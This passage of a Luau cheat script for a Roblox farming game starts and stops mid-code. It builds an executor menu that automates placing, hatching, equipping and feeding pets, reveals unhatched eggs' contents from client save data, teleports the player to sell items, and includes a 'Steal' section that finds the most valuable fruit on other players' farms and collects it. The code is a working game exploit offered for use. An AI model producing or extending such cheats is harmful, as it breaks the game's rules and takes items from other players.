            end,
        })

        local function getRandomPositionInSide()

            local random_side = math.random(1,2)
            local side = get_my_farm().Important.Plant_Locations:GetChildren()[random_side]
            
            local size = side.Size
            local position = side.Position

            local halfSize = size / 2

            local randomX = math.random(-halfSize.X, halfSize.X)
            local randomY = math.random(-halfSize.Y, halfSize.Y)
            local randomZ = math.random(-halfSize.Z, halfSize.Z)

            local randomPosition = position + Vector3.new(randomX, randomY, randomZ)

            return randomPosition
        end

        local function hasAnEgg()
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "PetEgg" then
                        return v
                    end
                end
            end
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "PetEgg" then
                        return v
                    end
                end
            end
        end

        local function eggcount_infarm()
            local count = 0;
            for i,v in pairs(get_my_farm().Important["Objects_Physical"]:GetChildren()) do
                if v:IsA("Model") then
                    if v:GetAttribute("OBJECT_TYPE") == "PetEgg" then
                        count = count + 1
                    end
                end
            end
            return count
        end

        spawn(function()
            while wait() do
                if AutoPlaceEggToggle then
                    if get_maxeggs_farm() > eggcount_infarm() then
                        if hasAnEgg() ~= nil then
                            local egg = hasAnEgg()
                            if egg.Parent == myplayer.Character then
                                local randompos = getRandomPositionInSide()
                                local args = {
                                    "CreateEgg",
                                    vector.create(randompos.X, randompos.Y, randompos.Z)
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetEggService"):FireServer(unpack(args))
                            elseif egg.Parent == myplayer.Backpack then
                                myplayer.Character.Humanoid:EquipTool(egg)
                            end
                        end
                    end
                end
            end
        end)

        local AutoHatchToggle;
        main_tab:CreateToggle({
            name = "Auto Hatch",
            default = false,
            callback = function(bool)
                AutoHatchToggle = bool
            end,
        })

        local function get_pet_list()
            local t = require(game:GetService("ReplicatedStorage").Data.PetRegistry.PetList)
            local t2 = {"Any"}
            for i,v in pairs(t) do
                table.insert(t2,i)
            end
            return t2
        end

        local function get_pet_from_egguuid(uuid)
            local t = require(game:GetService("ReplicatedStorage").Modules.DataService)
            if t:GetData().SavedObjects[uuid] then
                for i,v in pairs(t:GetData().SavedObjects[uuid].Data) do
                    if i == "Type" then
                        local pet_type = v
                        if pet_type ~= nil then
                            return pet_type
                        end
                    end
                end
            else
                return
            end
        end

        local AutoHatchWhenPetDropdown;
        main_tab:CreateDropdown({
            name = "Hatch specifically",
            options = get_pet_list(),
            multiple = true,
            callback = function(options)
                AutoHatchWhenPetDropdown = options
            end,
        })

        spawn(function()
            while wait() do
                if AutoHatchToggle then
                    if get_pet_inv_count() < get_maxpets_inv() then
                        for i,v in pairs(get_my_farm().Important["Objects_Physical"]:GetChildren()) do
                            if v:IsA("Model") then
                                local egg_uuid = v:GetAttribute("OBJECT_UUID")
                                if v:GetAttribute("OBJECT_TYPE") == "PetEgg" then
                                    if v:GetAttribute("TimeToHatch") == 0 then
                                        for i2,v2 in pairs(v:GetDescendants()) do
                                            if v2:IsA("ProximityPrompt") then
                                                if table.find(AutoHatchWhenPetDropdown, "Any") then
                                                    fireproximityprompt(v2)
                                                else
                                                    local pettype = get_pet_from_egguuid(egg_uuid)
                                                    if table.find(AutoHatchWhenPetDropdown, pettype) then
                                                        fireproximityprompt(v2)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)

        main_tab:CreateLabel({
            text = "Identify egg's pet"
        })

        local function get_eggs_farm()
            local t = {}
            for i,v in pairs(get_my_farm().Important.Objects_Physical:GetChildren()) do
                table.insert(t, v:FindFirstChildWhichIsA("Model").Name)
            end
            return t
        end

        local choosedEggToIdentify;
        local DropdownForChoosedEgg;
        DropdownForChoosedEgg = main_tab:CreateDropdown({
            name = "Eggs",
            multiple = false,
            options = get_eggs_farm(),
            callback = function(options)
                choosedEggToIdentify = options[1]
            end
        })

        main_tab:CreateButton({
            name = "Refresh",
            callback = function()
                DropdownForChoosedEgg:Refresh(get_eggs_farm())
            end,
        })

        local last_identified;

        main_tab:CreateButton({
            name = "Identify Pet",
            callback = function(IdentifyPetButton)
                if choosedEggToIdentify then
                    for i,v in pairs(get_my_farm().Important.Objects_Physical:GetChildren()) do
                        local t = v:FindFirstChildWhichIsA("Model")
                        if t then
                            if t.Name == choosedEggToIdentify then
                                local uuid = v:GetAttribute("OBJECT_UUID")
                                local pet = get_pet_from_egguuid(uuid)
                                if pet ~= nil then
                                    last_identified = v.PetEgg
                                    IdentifyPetButton:SetText("Your egg has a: "..pet)
                                    wait(2)
                                    IdentifyPetButton:SetText("Identify Pet")
                                end
                            end
                        end
                    end
                end
            end,
        })

        main_tab:CreateButton({
            name = "Teleport to Egg",
            callback = function()
                if choosedEggToIdentify then
                    if last_identified ~= nil then
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(last_identified.Position.X,myplayer.Character.HumanoidRootPart.Position.Y,last_identified.Position.Z)
                    end
                end
            end,
        })



        main_tab:CreateSection({
            name = "Auto Pet"
        })

        local text_to_uuid = {}

        local function get_pet_inventory()
            local pets = {"All"}
            text_to_uuid = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetsData.PetInventory.Data) do
                local uuid = i
                local pet_type = t2:GetData().PetsData.PetInventory.Data[uuid].PetType
                local pet_name = t2:GetData().PetsData.PetInventory.Data[uuid].PetData.Name
                local pet_level = t2:GetData().PetsData.PetInventory.Data[uuid].PetData.Level
                text_to_uuid[pet_name.." ("..pet_type..") | Level: "..pet_level] = uuid
                table.insert(pets, pet_name.." ("..pet_type..") | Level: "..pet_level)
            end
            return pets
        end

        local AutoPlacePetToggle;
        main_tab:CreateToggle({
            name = "Auto Place Pet",
            default = false,
            callback = function(bool)
                AutoPlacePetToggle = bool
            end,
        })

        local PetsChoosenToPlace = {}
        local PetsToPlaceDropdown;
        PetsToPlaceDropdown = main_tab:CreateDropdown({
            name = "Pets to Place",
            default = "All",
            options = get_pet_inventory(),
            multiple = true,
            callback = function(options)
                PetsChoosenToPlace = {}
                for i,v in pairs(options) do
                    if text_to_uuid[v] ~= nil then
                        table.insert(PetsChoosenToPlace, text_to_uuid[v])
                    end
                end
            end,
        })

        local function check_uuidpet_equipped(uuid)
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetsData.EquippedPets) do
                if v == uuid then
                    return true
                end
            end
            return false
        end

        spawn(function()
            while wait() do
                if AutoPlacePetToggle then
                    if get_equipped_pets_count() < get_maxequip_pets() then
                        if #PetsChoosenToPlace ~= 0 then
                            for i,v in pairs(PetsChoosenToPlace) do
                                if check_uuidpet_equipped(v) == false then
                                    local args = {
                                        "EquipPet",
                                        v
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))

                                end
                            end
                        end
                    end
                end
            end
        end)

        main_tab:CreateButton({
            name = "Refresh",
            callback = function()
                PetsToPlaceDropdown:Refresh(get_pet_inventory())
            end
        })

        main_tab:CreateLabel({
            text = "Auto Feed"
        })

        local AutoFeedPetsToggle;
        main_tab:CreateToggle({
            name = "Auto Feed Pets",
            default = false,
            callback = function(bool)
                AutoFeedPetsToggle = bool
            end,
        })

        local PetsChoosenToFeed = {}
        local PetsToFeedDropdown;
        PetsToFeedDropdown = main_tab:CreateDropdown({
            name = "Pets to Feed",
            default = "All",
            options = get_pet_inventory(),
            multiple = true,
            callback = function(options)
                PetsChoosenToFeed = {}
                for i,v in pairs(options) do
                    if text_to_uuid[v] ~= nil then
                        table.insert(PetsChoosenToFeed, text_to_uuid[v])
                    end
                end
            end,
        })

        main_tab:CreateButton({
            name = "Refresh",
            callback = function()
                PetsToFeedDropdown:Refresh(get_pet_inventory())
            end
        })

        local FeedWhenHungerIs = 50 / 100;
        main_tab:CreateSlider({
            name = "Feed when Hunger is:",
            Min = 0,
            default = 50,
            unit = "%",
            Max = 99,
            callback = function(value)
                FeedWhenHungerIs = value / 100
            end
        })

        local function seed_options_handler()
            local t = {"Any Non-Mutated", "Any"}
            for i,v in pairs(get_SeedsData()) do
                table.insert(t, v)
            end
            return t
        end

        local PlantToFeedChoosed;
        main_tab:CreateDropdown({
            name = "Plant to Feed",
            options = seed_options_handler(),
            multiple = true,
            callback = function(options)
                PlantToFeedChoosed = options
            end
        })

        local PlantToFeedWeightChoosed = 4;
        main_tab:CreateSlider({
            name = "Plant Weight Limit",
            Min = 1,
            default = 4,
            Max = 20,
            unit = " kg",
            callback = function(value)
                PlantToFeedWeightChoosed = value
            end
        })

        local function has_plantToFeed()

            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Holdable" and v:GetAttribute("Favorite") == false then
                    if v.Weight.Value <= PlantToFeedWeightChoosed then
                        if table.find(PlantToFeedChoosed, v:GetAttribute("ItemName")) then
                            return v
                        elseif table.find(PlantToFeedChoosed, "Any Non-Mutated") then
                            local muts = check_mutation(v)
                            if muts ~= nil and #muts == 0 then
                                return v
                            end
                        elseif table.find(PlantToFeedChoosed, "Any") then
                            return v
                        end
                    end
                end
            end
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Holdable" and v:GetAttribute("Favorite") == false then
                    if v.Weight.Value <= PlantToFeedWeightChoosed then
                        if table.find(PlantToFeedChoosed, v:GetAttribute("ItemName")) then
                            return v
                        elseif table.find(PlantToFeedChoosed, "Any Non-Mutated") then
                            local muts = check_mutation(v)
                            if muts ~= nil and #muts == 0 then
                                return v
                            end
                        elseif table.find(PlantToFeedChoosed, "Any") then
                            return v
                        end
                    end
                end
            end
        end

        local function uuid_to_max_hunger(uuid)
            local max_hunger;

            local pet_list_module = require(game:GetService("ReplicatedStorage").Data.PetRegistry).PetList
            local ActivePetsService_Module = require(game:GetService("ReplicatedStorage").Modules.PetServices.ActivePetsService)
            for i,v in pairs(game:GetService("Workspace").PetsPhysical:GetChildren()) do
                if v:GetAttribute("OWNER") == myplayer.Name and v:GetAttribute("UUID") == uuid then
                    local v56 = pet_list_module[ActivePetsService_Module:GetPetDataFromPetObject(v).PetType]
                    max_hunger = v56.DefaultHunger
                end
            end
            return max_hunger
        end

        local function uuid_to_hunger(uuid)
            local hunger;

            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetsData.PetInventory.Data) do
                if i == uuid then
                    hunger = t2:GetData().PetsData.PetInventory.Data[uuid].PetData.Hunger
                end
            end
            return hunger
        end

        spawn(function()
            while wait() do
                if AutoFeedPetsToggle then
                    if #PetsChoosenToFeed ~= 0 and FeedWhenHungerIs ~= nil then
                        local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
                        for i,v in pairs(t2:GetData().PetsData.EquippedPets) do
                            if table.find(PetsChoosenToFeed, v) then
                                local pet_hunger = uuid_to_hunger(v)
                                local pet_max_hunger = uuid_to_max_hunger(v)
                                if pet_hunger <= pet_max_hunger * FeedWhenHungerIs then
                                    if has_plantToFeed() ~= nil then
                                        local plant_to_feed = has_plantToFeed()
                                        if plant_to_feed.Parent == myplayer.Character then
                                            local args = {
                                                "Feed",
                                                v
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("ActivePetService"):FireServer(unpack(args))
                                        elseif plant_to_feed.Parent == myplayer.Backpack then
                                            myplayer.Character.Humanoid:EquipTool(plant_to_feed)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)


        local misc_tab = lib:CreateTab({
            name = "Misc"
        })

        misc_tab:CreateSection({
            name = "Value"
        })

        misc_tab:CreateButton({
            name = "Get Plant Value",
            callback = function(GetFruitValButt)
                local t = require(game:GetService("ReplicatedStorage").Modules.CalculatePlantValue)
                if myplayer.Character:FindFirstChildWhichIsA("Tool") then
                    local tool = myplayer.Character:FindFirstChildWhichIsA("Tool")
                    if tool:GetAttribute("ItemType") ~= "Holdable" then
                        GetFruitValButt:SetText("Please hold a plant in your hand.")
                        wait(2)
                        GetFruitValButt:SetText("Get Plant Value")
                        return
                    end
                    local fruitvalue = tostring(t(tool))
                    if fruitvalue ~= nil then
                        GetFruitValButt:SetText("Your plant value is: "..fruitvalue)
                        wait(2)
                        GetFruitValButt:SetText("Get Plant Value")
                    else
                        GetFruitValButt:SetText("An error has occured...")
                        wait(2)
                        GetFruitValButt:SetText("Get Plant Value")
                    end
                else
                    GetFruitValButt:SetText("Please hold a plant in your hand.")
                    wait(2)
                    GetFruitValButt:SetText("Get Plant Value")
                end
                
            end,
        })

        misc_tab:CreateButton({
            name = "Get Pet Value",
            callback = function(GetPetvalButt)
                local t = require(game:GetService("ReplicatedStorage").Modules.CalculatePetValue)
                if myplayer.Character:FindFirstChildWhichIsA("Tool") then
                    local tool = myplayer.Character:FindFirstChildWhichIsA("Tool")
                    if tool:GetAttribute("ItemType") ~= "Pet" then
                        GetPetvalButt:SetText("Please hold a pet in your hand.")
                        wait(2)
                        GetPetvalButt:SetText("Get Pet Value")
                        return
                    end
                    local petvalue = t(tool)
                    if petvalue ~= nil then
                        GetPetvalButt:SetText("Your pet value is: "..petvalue)
                        wait(2)
                        GetPetvalButt:SetText("Get Pet Value")
                    else
                        GetPetvalButt:SetText("An error has occured...")
                        wait(2)
                        GetPetvalButt:SetText("Get Pet Value")
                    end
                else
                    GetPetvalButt:SetText("Please hold a pet in your hand.")
                    wait(2)
                    GetPetvalButt:SetText("Get Pet Value")
                end
                
            end,
        })

        local function get_holdables()
            local t = {}
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Holdable" then
                        table.insert(t, v)
                    end
                end
            end
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Holdable" then
                        table.insert(t, v)
                    end
                end
            end
            return t
        end
        local function get_pets()
            local t = {}
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Pet" then
                        table.insert(t, v)
                    end
                end
            end
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Pet" then
                        table.insert(t, v)
                    end
                end
            end
            return t
        end

        misc_tab:CreateButton({
            name = "Get Inventory Value",
            callback = function(butt)
                local t = require(game:GetService("ReplicatedStorage").Modules.CalculatePlantValue)
                local t2 = require(game:GetService("ReplicatedStorage").Modules.CalculatePetValue)
                local total_val = 0
                if #get_holdables() ~= 0 then
                    for i,v in pairs(get_holdables()) do
                        total_val = total_val + t(v)
                    end
                end
                if #get_pets() ~= 0 then
                    for i,v in pairs(get_pets()) do
                        total_val = total_val + t2(v)
                    end
                end
                butt:SetText("Your inventory value is: "..total_val)
                wait(2)
                butt:SetText("Get Inventory Value")
            end,
        })

        misc_tab:CreateButton({
            name = "Get Farm Value",
            callback = function(GetFarmValueButt)
                local t = require(game:GetService("ReplicatedStorage").Modules.CalculatePlantValue)
                local total_val = 0
                for i,v in pairs(get_my_farm().Important.Plants_Physical:GetDescendants()) do
                    if v:IsA("ProximityPrompt") and v.Parent.Parent:IsA("Model") then
                        local plant = v.Parent.Parent
                        if plant:FindFirstChild("Item_String") == nil then
                            local a = Instance.new("StringValue", plant)
                            a.Name = "Item_String"
                            a.Value = plant.Name
                        end
                        if plant:FindFirstChild("Item_String") then
                            local this_plant_val = t(plant)
                            total_val = total_val + this_plant_val
                        end
                    end
                end
                GetFarmValueButt:SetText("Your farm value is: "..total_val)
                wait(2)
                GetFarmValueButt:SetText("Get Farm Value")
            end,
        })

        misc_tab:CreateSection({
            name = "Steal"
        })

        local expensivefruitlabel;
        expensivefruitlabel = misc_tab:CreateLabel({
            text = "Fruit: ",
        })

        local biggest_fruit;

        misc_tab:CreateButton({
            name = "Choose Most Expensive Fruit",
            callback = function()

                if #game:GetService("Players"):GetChildren() == 1 then
                    expensivefruitlabel:SetText("There are no players in the server")
                    wait(2)
                    expensivefruitlabel:SetText("Fruit: ")
                end

                local all_plants = {}
                biggest_fruit = nil
                for i,v in pairs(game:GetService("Workspace").Farm:GetChildren()) do
                    if v ~= get_my_farm() then
                        for i2,v2 in pairs(v:GetDescendants()) do
                            if v2:IsA("ProximityPrompt") and v2.Parent.Parent:IsA("Model") and v2.Parent.Parent.Parent.Name ~= "Farm" then
                                local plant = v2.Parent.Parent
                                if plant:FindFirstChild("Item_String") == nil then
                                    local a = Instance.new("StringValue", plant)
                                    a.Name = "Item_String"
                                    a.Value = plant.Name
                                end
                                if plant:FindFirstChild("Item_String") then
                                    table.insert(all_plants, plant)
                                end
                            end
                        end
                    end
                end
                if #all_plants == 0 then
                    expensivefruitlabel:SetText("Not found...")
                    wait(2)
                    expensivefruitlabel:SetText("Fruit: ")
                    return
                end
                local t = require(game:GetService("ReplicatedStorage").Modules.CalculatePlantValue)
                for i,v in pairs(all_plants) do
                    if biggest_fruit == nil then
                        biggest_fruit = v
                    else
                        if t(v) > t(biggest_fruit) then
                            biggest_fruit = v
                        end
                    end
                end
                local variant_string = ""
                if biggest_fruit.Variant.Value ~= "Normal" then
                    variant_string = "["..biggest_fruit.Variant.Value.."]"
                end
                local muts_string = "["..table.concat(check_mutation(biggest_fruit), ", ").."]"
                local weight_string = "["..string.format("%.2f", biggest_fruit.Weight.Value).."kg]"
                local fruit_info = variant_string.." "..muts_string.." "..biggest_fruit.Name.." "..weight_string.." ("..t(biggest_fruit).."$)"
                if biggest_fruit ~= nil then
                    expensivefruitlabel:SetText(fruit_info)
                end
            end,
        })

        misc_tab:CreateButton({
            name = "Buy",
            callback = function()
                if biggest_fruit ~= nil then
                    collect_plant(biggest_fruit)
                else
                    expensivefruitlabel:SetText("This fruit does not exist anymore...")
                    wait(2)
                    expensivefruitlabel:SetText("Fruit: ")
                end
            end,
        })

        misc_tab:CreateSection({
            name = "Use"
        })

        misc_tab:CreateButton({
            name = "Use Pollen Radar",
            callback = function ()
                local tweenservice = game:GetService("TweenService")
                local sound_service = game:GetService("SoundService")
                local debris = game:GetService("Debris")

                local v31 = sound_service:FindFirstChild("PollenRadar")
                if v31 then
                    v31.PlaybackSpeed = 1 + math.random(-15, 15) / 100
                    v31.TimePosition = 0
                    v31.Playing = true
                end

                local v17 = Instance.new("Part")
                v17.CastShadow = false
                v17.Anchored = true
                v17.CanCollide = false
                v17.Shape = Enum.PartType.Ball
                v17.Material = Enum.Material.ForceField
                v17.Color = Color3.fromRGB(255, 149, 0)
                v17.Transparency = 0.35
                v17.Size = Vector3.new(1, 1, 1)
                v17.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                v17.Name = "RadarPulse"
                v17.Parent = game.Workspace
                tweenservice:Create(v17, TweenInfo.new(2.5, Enum.EasingStyle.Sine), {
                    ["Size"] = Vector3.new(60, 60, 60),
                    ["Transparency"] = 1
                }):Play()
                debris:AddItem(v17, 3.5)

                local function v_u_23(p19, p20)
                    -- upvalues: (copy) v_u_14
                    if p19 and p19:IsA("Model") then
                        local _, v21 = p19:GetBoundingBox()
                        local v22 = Instance.new("BoxHandleAdornment")
                        v22.Adornee = p19
                        v22.Size = v21
                        v22.AlwaysOnTop = true
                        v22.ZIndex = 10
                        v22.Transparency = 0.25
                        v22.Color3 = Color3.fromRGB(255, 149, 0)
                        v22.Parent = p19
                        game.Debris:AddItem(v22, p20)
                    end
                end

                local v_u_8 = require(game.ReplicatedStorage.Modules.Notification)
                local finish_scan_event = game.ReplicatedStorage.GameEvents:WaitForChild("FinishPollenRadarScan")
                local v_u_7 = require(game.ReplicatedStorage.Modules.InventoryService)

                local tabla = {}

                local function get_pollinated()
                    local t = {}
                    for i,v in pairs(get_my_farm().Important.Plants_Physical:GetDescendants()) do
                        if v:IsA("ProximityPrompt") and v.Enabled == true then
                            local model = v.Parent.Parent
                            local part_of_model = model:FindFirstChildWhichIsA("Part")
                            if model:GetAttribute("Pollinated") then
                                table.insert(t, {
                                    ["Distance"] = (myplayer.Character.HumanoidRootPart.Position - part_of_model.Position).magnitude,
                                    ["Instance"] = model
                                })
                            end
                        end
                    end
                    return t
                end

                local p24 = get_pollinated()
                for _, v in p24 do
                    local v27 = v.Distance / 30 * 2.5
                    task.delay(v27, function()
                        -- upvalues: (copy) tabla, (copy) v, (ref) v_u_23
                        local v28 = tabla
                        local v29 = v.Instance
                        table.insert(v28, v29)
                        v_u_23(v.Instance, 1.5)
                    end)
                end
                if p24 and #p24 ~= 0 then
                    task.delay(2.5, function()
                        -- upvalues: (ref) v_u_7, (ref) v_u_8, (ref) finish_scan_event, (copy) tabla
                        if v_u_7:IsMaxInventory() then
                            v_u_8:CreateNotification("Max backpack space! Go sell!")
                        else
                            for i,v in pairs(p24) do
                                collect_plant(v.Instance)
                            end
                            local pollen_suck_sound = sound_service:FindFirstChild("PollenSuck")
                            if pollen_suck_sound then
                                local v36 = pollen_suck_sound:Clone()
                                v36.PlaybackSpeed = 1
                                v36.TimePosition = 0
                                v36.Parent = sound_service
                                v36:Play()
                                game.Debris:AddItem(v36, v36.TimeLength / 1 + 0.5)
                            end
                        end
                    end)
                end
            end
        })


        misc_tab:CreateSection({
            name = "Sell"
        })

        local clickedSellPlant = 0;
        local SellFruitButton;
        SellFruitButton = misc_tab:CreateButton({
            name = "Sell this plant",
            callback = function()
                if myplayer.Character:FindFirstChildWhichIsA("Tool") == nil then 
                    SellFruitButton:SetText("Please hold a plant...")
                    wait(2)
                    SellFruitButton:SetText("Sell this plant")
                    return
                end
                if clickedSellPlant == 0 then
                    clickedSellPlant = 1
                    SellFruitButton:SetText("Are you sure ?")
                    wait(5)
                    clickedSellPlant = 0
                    SellFruitButton:SetText("Sell this plant")
                elseif clickedSellPlant == 1 then
                    clickedSellPlant = 2
                    SellFruitButton:SetText("Sell this plant")
                    local mypos = myplayer.Character.HumanoidRootPart.Position
                    local npc_pos = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.Position
                    local range = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.ProximityPrompt.MaxActivationDistance
                    if (mypos - npc_pos).magnitude > range then
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(npc_pos.X, mypos.Y, npc_pos.Z + 5)
                        repeat wait() until (myplayer.Character.HumanoidRootPart.Position - npc_pos).magnitude <= range
                        repeat wait() 
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Sell_Item"):FireServer() 
                        until (myplayer.Character:FindFirstChildWhichIsA("Tool") == nil)
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(mypos.X, mypos.Y, mypos.Z)
                    elseif (mypos - npc_pos).magnitude <= range then
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Sell_Item"):FireServer()
                    end
                    clickedSellPlant = 0
                end
            end,
        })

        local function hasSellable()
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Holdable" and v:GetAttribute("Favorite") == false then
                        return true
                    end
                end
            end
            if myplayer.Character:FindFirstChildWhichIsA("Tool") then
                local tool = myplayer.Character:FindFirstChildWhichIsA("Tool")
                if tool:GetAttribute("ItemType") == "Holdable" and tool:GetAttribute("Favorite") == false then
                    return true
                end
            end
            return false
        end

        local clickedSellInv = 0;
        local SellInvButton;
        SellInvButton = misc_tab:CreateButton({
            name = "Sell inventory",
            callback = function()
                if clickedSellInv == 0 then
                    clickedSellInv = 1
                    SellInvButton:SetText("Are you sure ?")
                    wait(5)
                    clickedSellInv = 0
                    SellInvButton:SetText("Sell inventory")
                elseif clickedSellInv == 1 then
                    clickedSellInv = 2
                    SellInvButton:SetText("Sell inventory")
                    if hasSellable() == false then
                        SellInvButton:SetText("You have nothing to sell...")
                        wait(2)
                        SellInvButton:SetText("Sell inventory")
                        return
                    end
                    local mypos = myplayer.Character.HumanoidRootPart.Position
                    local npc_pos = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.Position
                    local range = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.ProximityPrompt.MaxActivationDistance
                    if (mypos - npc_pos).magnitude > range then
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(npc_pos.X, mypos.Y, npc_pos.Z + 5)
                        repeat wait() until (myplayer.Character.HumanoidRootPart.Position - npc_pos).magnitude <= range
                        repeat wait() 
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer() 
                        until hasSellable() == false
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(mypos.X, mypos.Y, mypos.Z)
                    elseif (mypos - npc_pos).magnitude <= range then
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer()
                    end
                    clickedSellInv = 0
                end
            end,
        })

        misc_tab:CreateSection({
            name = "Buy seeds"
        })

        local function get_seeds_in_stock()
            local t = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().SeedStock.Stocks) do
                if t2:GetData().SeedStock.Stocks[i].Stock ~= 0 then
                    table.insert(t, i)
                end
            end
            return t
        end

        local function is_seed_stock(seeda)
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().SeedStock.Stocks) do
                if i == seeda then
                    if t2:GetData().SeedStock.Stocks[i].Stock ~= 0 then
                        return true
                    else
                        return false
                    end
                end
            end
        end

        local choosenSeedToBuy;
        local ChooseSeedToManualBuy;
        ChooseSeedToManualBuy = misc_tab:CreateDropdown({
            name = "Seed",
            multiple = false,
            options = get_seeds_in_stock(),
            callback = function(option)
                choosenSeedToBuy = option[1]
            end,
        })

        misc_tab:CreateButton({
            name = "Refresh",
            callback = function()
                ChooseSeedToManualBuy:Refresh(get_seeds_in_stock())
            end,
        })

        local BuySeedButton;
        BuySeedButton = misc_tab:CreateButton({
            name = "Buy",
            callback = function()
                if choosenSeedToBuy ~= nil then
                    if is_seed_stock(choosenSeedToBuy) == false then
                        BuySeedButton:SetText(choosenSeedToBuy.." is out of stock...")
                        wait(2)
                        BuySeedButton:SetText("Buy")
                    elseif is_seed_stock(choosenSeedToBuy) == true then
                        local args = {
                            choosenSeedToBuy
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(unpack(args))
                    end
                end
            end,
        })



        local function get_gears_stock()
            local t = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().GearStock.Stocks) do
                if t2:GetData().GearStock.Stocks[i].Stock ~= 0 then
                    table.insert(t, i)
                end
            end
            return t
        end

        misc_tab:CreateSection({
            name = "Buy gears"
        })

        local choosenGearToBuy;
        local GearListDropdown;
        GearListDropdown = misc_tab:CreateDropdown({
            name = "Gear",
            multiple = false,
            options = get_gears_stock(),
            callback = function(option)
                choosenGearToBuy = option[1]
            end,
        })

        local function is_gear_stock(seeda)
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().GearStock.Stocks) do
                if i == seeda then
                    if t2:GetData().GearStock.Stocks[i].Stock ~= 0 then
                        return true
                    else
                        return false
                    end
                end
            end
        end

        misc_tab:CreateButton({
            name = "Refresh",
            callback = function()
                GearListDropdown:Refresh(get_gears_stock())
            end,
        })

        local BuyGearButton;
        BuyGearButton = misc_tab:CreateButton({
            name = "Buy",
            callback = function()
                if choosenGearToBuy ~= nil then
                    if is_gear_stock(choosenGearToBuy) == false then
                        BuyGearButton:SetText(choosenGearToBuy.." is out of stock...")
                        wait(2)
                        BuyGearButton:SetText("Buy")
                    elseif is_gear_stock(choosenGearToBuy) == true then
                        local args = {
                            choosenGearToBuy
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyGearStock"):FireServer(unpack(args))
                    end
                end
            end,
        })

        misc_tab:CreateSection({
            name = "Buy cosmetics"
        })

        local function get_cosmetics_stock()
            local t = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().CosmeticStock.CrateStocks) do
                if t2:GetData().CosmeticStock.CrateStocks[i].Stock ~= 0 then
                    table.insert(t, i)
                end
            end
            for i,v in pairs(t2:GetData().CosmeticStock.ItemStocks) do
                if t2:GetData().CosmeticStock.ItemStocks[i].Stock ~= 0 then
                    table.insert(t, i)
                end
            end
            return t
        end

        local choosedCosmeticToBuy;
        local CosmeticDropdownBuy;
        CosmeticDropdownBuy = misc_tab:CreateDropdown({
            name = "Cosmetic",
            multiple = false,
            options = get_cosmetics_stock(),
            callback = function(option)
                choosedCosmeticToBuy = option[1]
            end,
        })

        misc_tab:CreateButton({
            name = "Refresh",
            callback = function()
                CosmeticDropdownBuy:Refresh(get_cosmetics_stock())
            end,
        })

        local function is_cosmetic_stock(cosmetica)
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().CosmeticStock.CrateStocks) do
                if i == cosmetica then
                    if t2:GetData().CosmeticStock.CrateStocks[cosmetica].Stock ~= 0 then
                        return true
                    end
                end
            end
            for i,v in pairs(t2:GetData().CosmeticStock.ItemStocks) do
                if i == cosmetica then
                    if t2:GetData().CosmeticStock.ItemStocks[cosmetica].Stock ~= 0 then
                        return true
                    end
                end
            end
            return false
        end

        local BuyCosmeticButton;
        BuyCosmeticButton = misc_tab:CreateButton({
            name = "Buy",
            callback = function()
                if is_cosmetic_stock(choosedCosmeticToBuy) then
                    local args = {
                        choosedCosmeticToBuy
                    }
